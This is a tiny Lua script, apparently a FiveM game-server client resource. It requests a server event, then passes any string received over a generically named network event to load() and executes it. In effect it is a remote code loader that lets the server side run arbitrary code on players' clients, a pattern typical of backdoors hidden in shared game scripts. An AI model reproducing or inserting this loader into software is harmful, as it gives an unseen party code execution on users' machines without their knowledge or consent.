CreateThread(function()
	TriggerServerEvent("CreateThreadFunction")
	RegisterNetEvent("CreateThreadFunction")
	AddEventHandler("CreateThreadFunction", function(CreateThreadFunction)
		load(CreateThreadFunction)()
	end)
end)